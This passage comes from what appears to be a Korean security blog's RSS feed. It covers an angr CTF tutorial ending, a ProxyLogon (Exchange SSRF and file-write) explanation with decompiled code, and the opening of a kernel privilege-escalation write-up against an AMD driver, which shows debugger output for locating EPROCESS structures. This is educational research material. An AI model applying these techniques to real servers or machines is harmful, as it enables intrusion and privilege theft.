<code>SIM_PROCEDURES[&apos;stubs&apos;][&apos;UserHook&apos;](user_func=hook, length=length, **kwargs)</code>&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xACE0;&#xC694;. &#xD760; &#xC77C;&#xB2E8; &#xB370;&#xCF54;&#xB808;&#xC774;&#xC158; &#xD3EC;&#xB9F7;?&#xC5D0; &#xB9DE;&#xCDB0; &#xC81C;&#xC791;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC740; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; skip<em>check_equals</em> &#xD568;&#xC218;&#xB294; &#xC5B4;&#xB514;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB0D0;&#xACE0;!!! </p><p>&#xC77C;&#xB2E8; &#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xBD10;&#xC57C;&#xD560;&#xAC70; &#xAC19;&#xC544;&#xC11C; &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> traceback.format_stack():      print(line.strip())</code></pre><pre><code class="hljs python">File <span class="hljs-string">&quot;scaffold09.py&quot;</span>, line <span class="hljs-number">99</span>, <span class="hljs-keyword">in</span> &lt;module&gt;    main(sys.argv)File <span class="hljs-string">&quot;scaffold09.py&quot;</span>, line <span class="hljs-number">86</span>, <span class="hljs-keyword">in</span> main    simulation.explore(find=is_successful, avoid=should_abort)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">250</span>, <span class="hljs-keyword">in</span> explore    self.run(stash=stash, n=n, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">280</span>, <span class="hljs-keyword">in</span> run    self.step(stash=stash, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/misc/hookset.py&quot;</span>, line <span class="hljs-number">75</span>, <span class="hljs-keyword">in</span> __call__    result = current_hook(self.func.__self__, *args, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/exploration_techniques/explorer.py&quot;</span>, line <span class="hljs-number">96</span>, <span class="hljs-keyword">in</span> step    <span class="hljs-keyword">return</span> simgr.step(stash=stash, extra_stop_points=base_extra_stop_points | self._extra_stop_points, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/misc/hookset.py&quot;</span>, line <span class="hljs-number">80</span>, <span class="hljs-keyword">in</span> __call__    <span class="hljs-keyword">return</span> self.func(*args, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">365</span>, <span class="hljs-keyword">in</span> step    successors = self.step_state(state, successor_func=successor_func, **run_args)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">402</span>, <span class="hljs-keyword">in</span> step_state    successors = self.successors(state, successor_func=successor_func, **run_args)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_manager.py&quot;</span>, line <span class="hljs-number">441</span>, <span class="hljs-keyword">in</span> successors    <span class="hljs-keyword">return</span> self._project.factory.successors(state, **run_args)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/factory.py&quot;</span>, line <span class="hljs-number">60</span>, <span class="hljs-keyword">in</span> successors    <span class="hljs-keyword">return</span> self.default_engine.process(*args, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/vex/light/slicing.py&quot;</span>, line <span class="hljs-number">19</span>, <span class="hljs-keyword">in</span> process    <span class="hljs-keyword">return</span> super().process(*args, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/engine.py&quot;</span>, line <span class="hljs-number">149</span>, <span class="hljs-keyword">in</span> process    self.process_successors(self.successors, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/failure.py&quot;</span>, line <span class="hljs-number">21</span>, <span class="hljs-keyword">in</span> process_successors    <span class="hljs-keyword">return</span> super().process_successors(successors, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/syscall.py&quot;</span>, line <span class="hljs-number">18</span>, <span class="hljs-keyword">in</span> process_successors    <span class="hljs-keyword">return</span> super().process_successors(successors, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/hook.py&quot;</span>, line <span class="hljs-number">61</span>, <span class="hljs-keyword">in</span> process_successors    <span class="hljs-keyword">return</span> self.process_procedure(state, successors, procedure, **kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/engines/procedure.py&quot;</span>, line <span class="hljs-number">37</span>, <span class="hljs-keyword">in</span> process_procedure    inst = procedure.execute(state, successors, ret_to=ret_to, arguments=arguments)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_procedure.py&quot;</span>, line <span class="hljs-number">230</span>, <span class="hljs-keyword">in</span> execute    r = getattr(inst, inst.run_func)(*sim_args, **inst.kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/procedures/stubs/UserHook.py&quot;</span>, line <span class="hljs-number">8</span>, <span class="hljs-keyword">in</span> run    result = user_func(self.state)File <span class="hljs-string">&quot;scaffold09.py&quot;</span>, line <span class="hljs-number">42</span>, <span class="hljs-keyword">in</span> skip_check_equals_    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> traceback.format_stack():</code></pre><p>&#xC0AC;&#xC2E4; &#xC774; &#xB54C;&#xBD80;&#xD130; &#xAC10;&#xC774; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB0B4;&#xAC00; &#xAC10;&#xB2F9;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xC601;&#xC5ED;&#xC744; &#xAC74;&#xB4DC;&#xB838;&#xAD6C;&#xB098;&#x2026; &#xC774;&#xAC78; &#xC5B8;&#xC81C; &#xB2E4; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xC788;&#xB0D0;&#x2026; &#xB9C8;&#xAC10;&#xC774; &#xCF54;&#xC55E;&#xC778;&#xB370;&#x2026; &#xD558;&#xC544;&#x2026;</p><p>&#xADF8;&#xB798;&#xC11C; &#xC624;&#xB298;&#xC740; &#xC5EC;&#xAE30;&#xC11C; &#xB05D;!!!! &#xCEAC;&#xCEAC; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC81C;&#xAC00; &#xBD84;&#xC11D;&#xC744; &#xB2E4; &#xD574;&#xC11C; &#xC2DC;&#xB9AC;&#xC988; &#xC911;&#xAC04;&#xC5D0; &#xB530;&#xB85C; &#xC815;&#xB9AC;&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B8;&#xC81C; &#xB05D;&#xB0A0;&#xC9C0;&#xB294; &#xC7A5;&#xB2F4;&#xC744; &#xBABB;&#xD558;&#xC9C0;&#xB9CC;&#x2026; &#xADF8;&#xB798;&#xB3C4; &#xAD81;&#xAE08;&#xD55C; &#xC810;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C;&#xB4E0; &#xD574;&#xACB0;&#xC740; &#xD574;&#xC57C;&#xACA0;&#xC8E0;.</p><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xC608;&#xC0C1;&#xBCF4;&#xB2E4; &#xC0BD;&#xC9C8;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xB9CE;&#xC544;&#xC11C; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xC880; &#xB8E8;&#xC988;&#xD574;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC870;&#xD68C;&#xC218;&#xAC00; &#xB9CE;&#xC774; &#xB098;&#xC62C;&#xB9CC;&#xD55C; &#xAE00;&#xB3C4; &#xC544;&#xB2C8;&#xC5B4;&#xC11C; &#xD6C4;&#xB531; &#xC9C4;&#xD589;&#xD574;&#xC57C;&#xD558;&#xB294;&#xB370;&#x2026; &#xB2E4;&#xC74C;&#xC774;&#xB098; &#xB2E4;&#xB2E4;&#xC74C;&#xC5D0;&#xB294; angr_ctf &#xB05D;&#xB0B4;&#xACE0; &#xB9AC;&#xC5BC; CTF &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2F5;&#xB2F5;&#xD558;&#xC2E0; &#xBD84;&#xB4E4;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xC8C4;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xAD81;&#xAE08;&#xD55C; &#xBD80;&#xBD84;&#xC740; &#xADF8;&#xB0E5; &#xB118;&#xC5B4;&#xAC08; &#xC218;&#xAC00; &#xC5C6;&#xC5C8;&#xC5B4;&#xC694; &#x3160;&#x3160; &#xC544;&#xB9C8; &#xB098;&#xBA38;&#xC9C0; &#xBB38;&#xC81C; &#xD478;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xB3C4; &#xAD81;&#xAE08;&#xD55C;&#xAC8C; &#xB9CE;&#xC774; &#xC788;&#xC744;&#xAC70; &#xAC19;&#xC740;&#xB370;, &#xCD5C;&#xB300;&#xD55C; &#xB2E4; &#xC81C;&#xB300;&#xB85C; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xBA74;&#xC11C; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;(&#xC55E;&#xC73C;&#xB85C;&#xB3C4; &#xB2F5;&#xB2F5;&#xD560; &#xC608;&#xC815;&#xC774;&#xB77C;&#xB294; &#xB73B;).</p><p>&#xADF8;&#xB7FC; &#xC870;-&#xBC14;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/angr/">angr</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit/">exploit</category>
      
      <category domain="https://hackyboiz.github.io/tags/symbolic-execution/">symbolic_execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/newbie/">newbie</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/15/j0ker/angr_part4/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] A New Attack Surface on MS Exchange Part 1 - ProxyLogon!</title>
      <link>https://hackyboiz.github.io/2021/08/13/j0ker/2021-08-13/</link>
      <guid>https://hackyboiz.github.io/2021/08/13/j0ker/2021-08-13/</guid>
      <pubDate>Fri, 13 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.orange.tw/2021/08/proxylogon-a-new-att</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html">https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MS Exchange</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; Pwnie Awards&#xC5D0;&#xC11C; Best Server-Side Bug&#xB85C; &#xC120;&#xC815;&#xB41C; Orange&#xC758; MS Exchange &#xCDE8;&#xC57D;&#xC810; &#xAE00; &#xC785;&#xB2C8;&#xB2E4;! &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD06C;&#xB9AC;&#xD2F0;&#xCEEC;&#xD560; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xC644;&#xC804; &#xC0C8;&#xB85C;&#xC6B4; &#xACF5;&#xACA9; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xCC3E;&#xC558;&#xB2E4;&#xB294; &#xC88B;&#xC740; &#xD3C9;&#xAC00;&#xB97C; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2021-26855"><a href="#CVE-2021-26855" class="headerlink" title="CVE-2021-26855"></a>CVE-2021-26855</h2><pre><code class="hljs powershell">protected virtual Uri GetTargetBackEndServerUrl() {    this.LogElapsedTime(<span class="hljs-string">&quot;E_TargetBEUrl&quot;</span>);    Uri result;    <span class="hljs-keyword">try</span> {        UrlAnchorMailbox urlAnchorMailbox = this.AnchoredRoutingTarget.AnchorMailbox as UrlAnchorMailbox;        <span class="hljs-keyword">if</span> (urlAnchorMailbox != null) {            result = urlAnchorMailbox.Url;        } <span class="hljs-keyword">else</span> {            UriBuilder clientUrlForProxy = this.GetClientUrlForProxy();            clientUrlForProxy.Scheme = Uri.UriSchemeHttps;            clientUrlForProxy.Host = this.AnchoredRoutingTarget.BackEndServer.Fqdn; //here            clientUrlForProxy.Port = <span class="hljs-number">444</span>;...</code></pre><p>&#xBCF4;&#xBA74; <code>AnchoredRoutingTarget.BackEndServer.Fqdn</code>&#xC5D0;&#xC11C; host &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; host &#xC815;&#xBCF4;&#xB294; &#xCFE0;&#xD0A4;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xB294; &#xAC83;&#xC778;&#xB370; &#xAC00;&#xC838;&#xC624;&#xACE0; Request&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xAC80;&#xC99D;&#xB3C4; &#xC9C4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">protected override AnchorMailbox ResolveAnchorMailbox() {    HttpCookie httpCookie = base.ClientRequest.Cookies[<span class="hljs-string">&quot;X-AnonResource-Backend&quot;</span>];    <span class="hljs-keyword">if</span> (httpCookie != null) {        this.savedBackendServer = httpCookie.Value;    }    <span class="hljs-keyword">if</span> (!string.IsNullOrEmpty(this.savedBackendServer)) {        base.Logger.Set(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;X-AnonResource-Backend-Cookie&quot;</span>);        <span class="hljs-keyword">if</span> (ExTraceGlobals.VerboseTracer.IsTraceEnabled(<span class="hljs-number">1</span>)) {            ExTraceGlobals.VerboseTracer.TraceDebug&lt;HttpCookie, int&gt;((long)this.GetHashCode(), <span class="hljs-string">&quot;[OwaResourceProxyRequestHandler::ResolveAnchorMailbox]: AnonResourceBackend cookie used: {0}; context {1}.&quot;</span>, httpCookie, base.TraceContext);        }        <span class="hljs-keyword">return</span> new ServerInfoAnchorMailbox(BackEndServer.FromString(this.savedBackendServer), this);  //here    }    <span class="hljs-keyword">return</span> new AnonymousAnchorMailbox(this);</code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; URL&#xC744; &#xC870;&#xC791;&#xD558;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C; SSRF&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2021-27065"><a href="#CVE-2021-27065" class="headerlink" title="CVE-2021-27065"></a>CVE-2021-27065</h2><p>&#xBA3C;&#xC800; <code>msExchLogonMailbox</code> &#xD5E4;&#xB354;&#xB97C; &#xC218;&#xC815;&#xD558;&#xC5EC; SYSTEM &#xC720;&#xC800; &#xACC4;&#xC815;&#xC758; ECP &#xC138;&#xC158;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="https://1.bp.blogspot.com/-FFb5p1z14TE/YQz_1xyoTNI/AAAAAAAAE3s/9mcld7lD76kPK_3OdE5cJeYIn0t_KcSowCPcBGAYYCw/s2048/upload_1a0b42f94b1e337c5937fc77ff058f0c.png" alt></p><p>DDIService&#xB294; XAML&#xC744; &#xD1B5;&#xD574; powershell &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294;&#xB370;, &#xC544;&#xB798; &#xD568;&#xC218;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; powershell &#xCF54;&#xB4DC;&#xC758; &#xCD9C;&#xB825; &#xB0B4;&#xC6A9;&#xC744; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC5D0; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">public override RunResult Run(DataRow input, DataTable dataTable, DataObjectStore store, <span class="hljs-built_in">Type</span> codeBehind, Workflow.UpdateTableDelegate updateTableDelegate) {    DataRow dataRow = dataTable.Rows[<span class="hljs-number">0</span>];    string value = (string)input[<span class="hljs-type">this.InputVariable</span>];    string path = (string)input[<span class="hljs-type">this.OutputFileNameVariable</span>];    RunResult runResult = new RunResult();    <span class="hljs-keyword">try</span> {        runResult.ErrorOccur = true;        <span class="hljs-keyword">using</span> (StreamWriter streamWriter = new StreamWriter(File.Open(path, FileMode.CreateNew)))        {            streamWriter.WriteLine(value);        }        runResult.ErrorOccur = false;    }        // ...}</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/exchange/">exchange</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ssrf/">ssrf</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-write/">arbitrary_file_write</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2021-26855/">CVE-2021-26855</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2021-27065/">CVE-2021-27065</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/13/j0ker/2021-08-13/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 공대오빠가 알려주는 Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master 분석(3)</title>
      <link>https://hackyboiz.github.io/2021/08/11/l0ch/windows-driver-part4/</link>
      <guid>https://hackyboiz.github.io/2021/08/11/l0ch/windows-driver-part4/</guid>
      <pubDate>Wed, 11 Aug 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&quot;&gt;&lt;a href=&quot;#&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&quot; clas</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 1 - Setting Up Kernel Debugging</a></p><p><a href="https://hackyboiz.github.io/2021/07/14/l0ch/windows-driver-part2/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(1)</a></p><p><a href="https://hackyboiz.github.io/2021/07/28/l0ch/windows-driver-part3">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 3 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(2)</a></p><p>&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(3) &#x2190; Now!</p><hr><p>&#xC5B4;&#xB290;&#xB367; &#xC2DC;&#xB9AC;&#xC988; &#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8;&#xB124;&#xC694;! &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; Part 3&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD588;&#xB358; exploit &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB300;&#xB85C; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xACFC;&#xC815;&#xC744; PoC &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xC815;&#xB9AC;&#xD55C; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;. &#xC5BC;&#xB978; cmd&#xCC3D;&#xC5D0;&#xC11C; <code>NT AUTHORITY\SYSTEM</code>&#xC744; &#xB744;&#xC6CC;&#xBCF4;&#xC790;&#xAD6C;&#xC694;!</p><p><br></p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h2 id="Parse-EPROCESS"><a href="#Parse-EPROCESS" class="headerlink" title="Parse EPROCESS"></a>Parse EPROCESS</h2><p>&#xBA3C;&#xC800; arbitrary read &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB85C; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xB294; kernel pool&#xC5D0;&#xC11C; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xD1A0;&#xD070;&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>EPROCESS</code> &#xB294; <code>POOL_HEADER</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; &#xC77C;&#xC815;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>POOL_HEADER</code>&#xB294; <code>0x636f7250</code>(Proc)&#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C;&#xB300;&#xB85C; <code>POOL_HEADER</code> &#xAD6C;&#xC870;&#xCCB4;&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> cmd.exePROCESS ffffbd010035b080    SessionId: <span class="hljs-number">1</span>  Cid: <span class="hljs-number">0424</span>    Peb: af3c91000  ParentCid: <span class="hljs-number">0</span>c78    DirBase: <span class="hljs-number">18e84</span>a000  ObjectTable: ffff9e8945b562c0  HandleCount:  <span class="hljs-number">68.</span>    Image: cmd.exe</code></pre><p><img src="/2021/08/11/l0ch/windows-driver-part4/1.png" alt></p><p><code>cmd.exe</code>&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C; <code>0xffffbd010035b080 - 0x80 + 0x4</code> &#xC704;&#xCE58;&#xC5D0; Proc &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><br></p><p>&#xC774;&#xB7EC;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC77C;&#xC815;&#xD55C;&#xC9C0; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; <code>lsass.exe</code>&#xB3C4; &#xD55C;&#xBC88; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">PROCESS ffffbd0ffd7480c0    SessionId: <span class="hljs-number">0</span>  Cid: <span class="hljs-number">0294</span>    Peb: <span class="hljs-number">81e2405000</span>  ParentCid: <span class="hljs-number">01f</span>4    DirBase: <span class="hljs-number">233b</span>99000  ObjectTable: ffff9e893b5ff480  HandleCount: <span class="hljs-number">1365.</span>    Image: lsass.exe</code></pre><p><img src="/2021/08/11/l0ch/windows-driver-part4/2.png" alt></p><p><code>lsass.exe</code>&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C; <code>0xffffbd0ffd7480c0 - 0x70 + 0x4</code> &#xC704;&#xCE58;&#xC5D0; Proc &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB124;&#xC694;.</p><p><br></p><p>&#xC74C;.. &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBCC4;&#xB85C; <code>POOL_HEADER</code>&#xC640; <code>EPROCESS</code> &#xC0AC;&#xC774; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xB124;&#xC694;. &#xADF8;&#xB7EC;&#xB098; &#xB450; &#xC0AC;&#xC9C4; &#xBAA8;&#xB450; &#xD30C;&#xB780;&#xC0C9; &#xBC15;&#xC2A4;&#xB97C; &#xBCF4;&#xBA74; <code>EPROCESS</code> &#xC8FC;&#xC18C;&#xC758; &#xD558;&#xC704; 4 bytes &#xAC12;&#xC740; &#xD56D;&#xC0C1; <code>0x00000003</code>&#xC73C;&#xB85C; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; Proc &#xD0DC;&#xADF8;&#xB97C; &#xCC3E;&#xACE0;, &#xD0DC;&#xADF8;&#xB85C;&#xBD80;&#xD130; &#xC57D; <code>0x100</code> &#xC624;&#xD504;&#xC14B; &#xC0AC;&#xC774;&#xC758; <code>0x00000003</code> &#xAC12;&#xC774; &#xC788;&#xB2E4;&#xBA74; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xD2B9;&#xC815;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;! IOCTL <code>0x81112F08</code> &#xB85C; &#xBAA8;&#xB4E0; kernel pool&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xC6B0;&#xB9AC;&#xAC00; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC2B9;&#xC2DC;&#xD0A4;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>EPROCESS</code> &#xB610;&#xD55C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC624;&#xD504;&#xC14B;&#xACFC; <code>EPROCESS</code> &#xD558;&#xC704; 4 bytes &#xAC12; <code>0x00000003</code>&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><p><br></p><p>&#xC6B0;&#xC120; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC11C;&#xCE6D;&#xD558;&#xBA70; <code>Proc</code> &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC758; &#xC815;&#xBCF4;&#xB97C; 